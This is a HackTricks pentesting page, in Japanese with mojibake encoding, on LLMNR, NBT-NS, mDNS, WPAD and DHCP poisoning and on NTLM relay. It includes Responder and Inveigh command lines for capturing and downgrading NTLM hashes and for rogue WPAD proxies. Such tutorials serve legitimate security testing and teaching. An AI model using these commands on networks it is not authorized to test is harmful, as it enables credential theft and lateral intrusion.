# LLMNRã€NBT-NSã€mDNS/DNSã€WPADãŠã‚ˆã³ãƒªãƒ¬ãƒ¼ã‚¢ã‚¿ãƒƒã‚¯

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ­ãƒˆã‚³ãƒ«

### LLMNRã€NBT-NSã€ãŠã‚ˆã³mDNS

Microsoftã‚·ã‚¹ãƒ†ãƒ ã§ã¯ã€DNSã®æ¤œç´¢ãŒå¤±æ•—ã—ãŸå ´åˆã«ã€ãƒªãƒ³ã‚¯ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒ«ãƒã‚­ãƒ£ã‚¹ãƒˆåè§£æ±ºï¼ˆLLMNRï¼‰ã¨NetBIOSåã‚µãƒ¼ãƒ“ã‚¹ï¼ˆNBT-NSï¼‰ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ›ã‚¹ãƒˆã®è§£æ±ºã‚’è¡Œã„ã¾ã™ã€‚Apple BonjourãŠã‚ˆã³Linuxã®ã‚¼ãƒ­æ§‹æˆå®Ÿè£…ã§ã¯ã€ãƒãƒ«ãƒã‚­ãƒ£ã‚¹ãƒˆDNSï¼ˆmDNSï¼‰ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®ã‚·ã‚¹ãƒ†ãƒ ã‚’æ¤œå‡ºã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯èªè¨¼ã•ã‚Œã¦ãŠã‚‰ãšã€UDPä¸Šã§ãƒ–ãƒ­ãƒ¼ãƒ‰ã‚­ãƒ£ã‚¹ãƒˆãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã€æ”»æ’ƒè€…ã¯ã“ã‚Œã‚‰ã‚’æ‚ªæ„ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èª˜å°ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Responderã‚’ä½¿ç”¨ã—ã¦ã€ãƒ›ã‚¹ãƒˆãŒæ¤œç´¢ã™ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚å½ã®å¿œç­”ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã«Responderã‚’ä½¿ç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€[ã“ã¡ã‚‰](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### WPAD

å¤šãã®ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€Web Proxy Auto-Discoveryï¼ˆWPADï¼‰ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‹ã‚‰ãƒ—ãƒ­ã‚­ã‚·è¨­å®šã‚’èª­ã¿è¾¼ã¿ã¾ã™ã€‚WPADã‚µãƒ¼ãƒãƒ¼ã¯ã€æ¬¡ã®ã„ãšã‚Œã‹ã§ç‰¹å®šã®URLï¼ˆä¾‹ï¼š_http://wpad.example.org/wpad.dat_ï¼‰ã‚’ä»‹ã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®ãƒ—ãƒ­ã‚­ã‚·è¨­å®šã‚’æä¾›ã—ã¾ã™ã€‚

* DHCPï¼ˆã‚³ãƒ¼ãƒ‰252ã‚¨ãƒ³ãƒˆãƒªã‚’ä½¿ç”¨ï¼‰[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* ãƒ­ãƒ¼ã‚«ãƒ«ãƒ‰ãƒ¡ã‚¤ãƒ³ã§_wpad_ãƒ›ã‚¹ãƒˆåã‚’æ¤œç´¢ã™ã‚‹DNS
* Microsoft LLMNRãŠã‚ˆã³NBT-NSï¼ˆDNSã®æ¤œç´¢ãŒå¤±æ•—ã—ãŸå ´åˆï¼‰

Responderã¯WPADæ”»æ’ƒã‚’è‡ªå‹•åŒ–ã—ã¾ã™ã€‚ãƒ—ãƒ­ã‚­ã‚·ã‚’å®Ÿè¡Œã—ã€DHCPã€DNSã€LLMNRã€ãŠã‚ˆã³NBT-NSã‚’ä»‹ã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚’æ‚ªæ„ã®ã‚ã‚‹WPADã‚µãƒ¼ãƒãƒ¼ã«èª˜å°ã—ã¾ã™ã€‚

## ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®æ”¹ã–ã‚“

### Responder - LLMNRã€NBT-NSã€ãŠã‚ˆã³MDNS

> Responderã¯LLMNRã€NBT-NSã€ãŠã‚ˆã³MDNSã®ãƒã‚¤ã‚ºãƒŠãƒ¼ã§ã™ã€‚åå‰ã®æ¥å°¾è¾ã«åŸºã¥ã„ã¦ã€_ç‰¹å®šã®_ NBT-NSï¼ˆNetBIOSåã‚µãƒ¼ãƒ“ã‚¹ï¼‰ã‚¯ã‚¨ãƒªã«å¿œç­”ã—ã¾ã™ï¼ˆè©³ç´°ã«ã¤ã„ã¦ã¯ã€[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)ã‚’å‚ç…§ï¼‰ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ãƒ„ãƒ¼ãƒ«ã¯SMBç”¨ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚µãƒ¼ãƒãƒ¼ã‚µãƒ¼ãƒ“ã‚¹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã®ã¿å¿œç­”ã—ã¾ã™ã€‚
>
> ã“ã‚Œã«ã‚ˆã‚Šã€å›ç­”ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã™ã‚‹ã“ã¨ãŒã§ãã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§ã‚¹ãƒ†ãƒ«ã‚¹æ€§ã‚’æŒãŸã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ­£å½“ãªNBT-NSã®å‹•ä½œã‚’å£Šã•ãªã„ã‚ˆã†ã«ã™ã‚‹ã®ã«ã‚‚å½¹ç«‹ã¡ã¾ã™ã€‚

* [**Responder**](https://github.com/lgandx/Responder)ã¯ã€kaliã«ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ãŠã‚Šã€è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã¯\*\*`/etc/responder/Responder.conf` \*\*ã«ã‚ã‚Šã¾ã™ï¼ˆã“ã“ã§ãƒ­ãƒ¼ã‚°ã‚µãƒ¼ãƒãƒ¼ã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰
* **Responder**ã¯**ãƒãƒƒã‚·ãƒ¥ã‚’ç”»é¢ã«è¡¨ç¤º**ã—ã€ãƒ›ã‚¹ãƒˆã”ã¨ã«`/usr/share/responder/logs`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚‹**ãƒ­ã‚°**ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¿ã¾ã™ã€‚ãƒãƒƒã‚·ãƒ¥ã¯`(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`ã®å½¢å¼ã§ä¿å­˜ã•ã‚Œã¾ã™ã€‚
* **Responder**ã®**Windowsç‰ˆ**ã¯[ã“ã¡ã‚‰](https://github.com/lgandx/Responder-Windows)ã§å…¥æ‰‹ã§ãã¾ã™ã€‚
* Responderã¯**IPv4**ãŠã‚ˆã³**IPv6**ã§å‹•ä½œã—ã¾ã™ã€‚

#### Responderãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

Responderã¯ä»¥ä¸‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ï¼š
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Responder Params</summary>

* `-A`ãƒ•ãƒ©ã‚°ã¯**è§£æãƒ¢ãƒ¼ãƒ‰**ã«å…¥ã‚Šã€å¿œç­”ã‚’æ¯’åŒ–ã›ãšã«ç’°å¢ƒå†…ã®NBT-NSã€BROWSERã€ãŠã‚ˆã³LLMNRãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡¨ç¤ºã§ãã¾ã™ã€‚
* å¿…ãšã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¾ãŸã¯IPã‚’æŒ‡å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* `-wf`ã¯WPADãƒ­ãƒ¼ã‚°ãƒ—ãƒ­ã‚­ã‚·ã‚µãƒ¼ãƒãƒ¼ã‚’èµ·å‹•ã—ã¾ã™ã€‚
* `-f`ã¯ãƒªãƒ¢ãƒ¼ãƒˆãƒ›ã‚¹ãƒˆã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã¨ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æŒ‡ç´‹èªè­˜ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚
* è¿½åŠ ã®ãƒ‡ãƒ¼ã‚¿ãŒã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œã‚‹ãŸã‚ã€`-v`ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦å†—é•·æ€§ã‚’é«˜ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* `-F`ã‚„`-P`ãªã©ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€NTLMèªè¨¼ã‚„åŸºæœ¬èªè¨¼ã‚’å¼·åˆ¶ã—ãŸã‚Šã€ãƒ—ãƒ­ã‚­ã‚·èªè¨¼ã‚’å¼·åˆ¶ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€æ³¨æ„ã—ã¦ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* `-w`ãƒ•ãƒ©ã‚°ã¯çµ„ã¿è¾¼ã¿ã®WPADãƒ—ãƒ­ã‚­ã‚·ã‚µãƒ¼ãƒãƒ¼ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã¯ç‰¹ã«å¤§è¦æ¨¡ãªçµ„ç¹”ã§éå¸¸ã«åŠ¹æœçš„ã§ã‚ã‚Šã€[Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€Internet Explorerã‚’èµ·å‹•ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã™ã¹ã¦ã®HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¾ã™ã€‚

</details>

#### Responderã®å®Ÿè¡Œ

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®Responderã®å‹•ä½œã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã ã‘ã§ã™ã€‚
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
èˆˆå‘³æ·±ã„ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€å¯èƒ½ãªå ´åˆã«ã¯ãƒ¬ã‚¹ãƒãƒ³ãƒ€ã‚’ä½¿ç”¨ã—ã¦NTLMèªè¨¼ã‚’ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**NTLMv2ã§ã¯ãªãNTLMv1ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹**ã‚’**ç°¡å˜ã«ã‚¯ãƒ©ãƒƒã‚¯**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™[**ã“ã®ã‚¬ã‚¤ãƒ‰ã«å¾“ã£ã¦**](../../windows-hardening/ntlm/#ntlmv1-attack)**ã€‚**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**WPADã®ãªã‚Šã™ã¾ã—ã¯å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“**ãŒã€æ¬¡ã®æ‰‹é †ã§å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```bash
responder -I <Iface> --wpad
```
ã‚ãªãŸã®IPã§NetBIOSãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è§£æ±ºã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãã—ã¦ã€**èªè¨¼ãƒ—ãƒ­ã‚­ã‚·**ã‚’ä½œæˆã—ã¾ã™:
```bash
responder.py -I <interface> -Pv
```
NTLMãƒãƒƒã‚·ãƒ¥ã‚’å‚å—ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ãŒï¼ˆé€šå¸¸ã¯ã§ãã¾ã›ã‚“ï¼‰ã€ç°¡å˜ã«ã„ãã¤ã‹ã®**NTLMãƒãƒ£ãƒ¬ãƒ³ã‚¸ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹**ã‚’å–å¾—ã—ã€ãŸã¨ãˆã°_john_ã‚ªãƒ—ã‚·ãƒ§ãƒ³`--format=netntlmv2`ã‚’ä½¿ç”¨ã—ã¦**ã‚¯ãƒ©ãƒƒã‚¯**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Kaliã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®_Responder_ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã®**ãƒ­ã‚°ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸**ã¯`/usr/share/responder/logs`ã«ã‚ã‚Šã¾ã™ã€‚

#### Responder - DHCPãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°

Windowsã¯NetBIOSã€WINSã€WPADè¨­å®šãªã©ã€ã„ãã¤ã‹ã®ã‚«ã‚¹ã‚¿ãƒ DHCPã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯è¨­å®šã‚’å–å¾—ã™ã‚‹ãŸã‚ã«DHCPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã¨ãã€ã“ã‚Œã‚‰ã®è¿½åŠ ã®è¨­å®šã¯DHCPå¿œç­”ã«å«ã¾ã‚Œã€ç°¡å˜ãªæ¥ç¶šæ€§ã¨åå‰è§£æ±ºã‚’å®¹æ˜“ã«ã—ã¾ã™ã€‚

DHCPå¿œç­”ã®ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã¯ã€ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ§‹æˆã«å¹²æ¸‰ã™ã‚‹ãŸã‚ã€ä¸­æ–­ãªã—ã§è¡Œã†ã“ã¨ã¯å›°é›£ã§ã™ã€‚é€šå¸¸ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚µãƒ–ãƒãƒƒãƒˆã®DNSã‚µãƒ¼ãƒãƒ¼ã€ã‚¹ã‚¤ãƒƒãƒã€ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ãƒ†ãƒ¼ãƒ–ãƒ«ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã€ãƒãƒƒãƒˆãƒã‚¹ã‚¯ã€DHCPã‚µãƒ¼ãƒãƒ¼ãªã©ã«ã¤ã„ã¦éå¸¸ã«è‰¯ã„çŸ¥è­˜ãŒå¿…è¦ã§ã™ã€‚ã“ã‚Œã‚‰ã®è¨­å®šã«èª¤ã‚ŠãŒã‚ã‚‹ã¨ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ä¸­æ–­ãŒç”Ÿã˜ã¾ã™ã€‚

ãŸã ã—ã€DHCPå¿œç­”ã®ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã«ã¯ç‹¬è‡ªã®åˆ©ç‚¹ãŒã‚ã‚Šã¾ã™ã€‚ARPãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°ã‚ˆã‚Šã‚‚**ç¢ºå®Ÿã«ã‚¹ãƒ†ãƒ«ã‚¹æ€§ãŒã‚ã‚Šã¾ã™**ã€‚ãƒ¦ãƒ‹ã‚­ãƒ£ã‚¹ãƒˆå¿œç­”ã¯ã€è¢«å®³è€…ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°æƒ…å ±ã‚’æ°¸ä¹…ã«ãƒã‚¤ã‚ºãƒ³ã™ã‚‹ãŸã‚ã«1ã¤ã®ãƒ¦ãƒ‹ã‚­ãƒ£ã‚¹ãƒˆå¿œç­”ãŒååˆ†ã§ã‚ã‚Šã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§è¤‡æ•°ã®DHCPã‚µãƒ¼ãƒãƒ¼ãŒå‹•ä½œã—ã¦ã„ã‚‹ã“ã¨ã‚‚ã‚ˆãã‚ã‚Šã¾ã™ã€‚ãƒ¦ãƒ‹ã‚­ãƒ£ã‚¹ãƒˆDHCPå¿œç­”ã¯æ¤œå‡ºãŒã‚ˆã‚Šè¤‡é›‘ã§ã‚ã‚Šã€ä¸€éƒ¨ã®ã‚¹ã‚¤ãƒƒãƒã¯DHCPã‚¹ãƒŒãƒ¼ãƒ”ãƒ³ã‚°ã‚’é˜²ããŸã‚ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šã‚’æä¾›ã—ã¦ã„ã¾ã™ãŒã€ã“ã‚Œã‚‰ã®è¨­å®šã¯ç›´æ„Ÿçš„ã§ã¯ãªãã€æœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã«ã¯ã—ã°ã—ã°èª¤ã£ã¦è¨­å®šã•ã‚Œã¦ã„ã¾ã™ã€‚

> ã“ã®æ”»æ’ƒã¯éå¸¸ã«åŠ¹æœçš„ã§ã€ç¢ºå®Ÿã«NTLMv1/2ãƒãƒƒã‚·ãƒ¥ã‚’æä¾›ã—ã¾ã™ã€‚
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - èªè¨¼æƒ…å ±ã®ã‚­ãƒ£ãƒ—ãƒãƒ£

Responderã¯ã€**æŒ‡å®šã•ã‚ŒãŸãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’ãªã‚Šã™ã¾ã™**ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã„ã‚‹å ´åˆã€**å½¼ã¯Responderã«å¯¾ã—ã¦èªè¨¼ã‚’è©¦ã¿**ã€Responderã¯ã€Œèªè¨¼æƒ…å ±ã€ï¼ˆãŠãã‚‰ãNTLMv2ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸/ãƒ¬ã‚¹ãƒãƒ³ã‚¹ï¼‰ã‚’**ã‚­ãƒ£ãƒ—ãƒãƒ£**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

NetNTLMv1ã¸ã®ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã‚’è©¦ã¿ã‚‹ã‹ã€ESSã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveighã¯ã€Windowsã‚·ã‚¹ãƒ†ãƒ ã«åˆ¶é™ã•ã‚Œã¦ã„ã‚‹ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼/ãƒ¬ãƒƒãƒ‰ãƒãƒ¼ãƒ å‘ã‘ã®PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚¡ãƒ¼ãŠã‚ˆã³ä¸­é–“è€…ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)ã¯ã€PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã—ãŸãŒã€ç¾åœ¨ã¯C#ãƒã‚¤ãƒŠãƒªã¨ãªã‚Šã€Responderã¨åŒã˜ä¸»ãªæ©Ÿèƒ½ã‚’å‚™ãˆã¦ã„ã¾ã™ã€‚[**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)ã«ã¯ã€ã™ã¹ã¦ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ä½¿ç”¨æ–¹æ³•ã®èª¬æ˜ãŒãƒªã‚¹ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚\
åˆ¥ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯[**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

ã¾ãŸã¯ã€ã‚ˆã‚Šå¤šãã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
ã¾ãŸã¯ã€C#ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š
```bash
Inveigh.exe
```
## NTLMãƒªãƒ¬ãƒ¼ã‚¢ã‚¿ãƒƒã‚¯

ã“ã®æ”»æ’ƒã¯ã€å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®**ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³**ã«å¯¾ã—ã¦ã€**SMBèªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³**ã‚’ãƒªãƒ¬ãƒ¼ã—ã¾ã™ã€‚èªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒ**æˆåŠŸã—ãŸå ´åˆ**ã€è‡ªå‹•çš„ã«**ã‚·ã‚¹ãƒ†ãƒ ã®ã‚·ã‚§ãƒ«**ã«ç§»è¡Œã—ã¾ã™ã€‚ãŸã ã—ã€ãƒªãƒ¬ãƒ¼ã•ã‚Œã‚‹èªè¨¼ã¯ã€ãƒªãƒ¬ãƒ¼ã•ã‚ŒãŸãƒ›ã‚¹ãƒˆã«**ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã‹ã‚‰è¡Œã‚ã‚Œã€**SMBç½²åãŒç„¡åŠ¹**ã«ãªã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

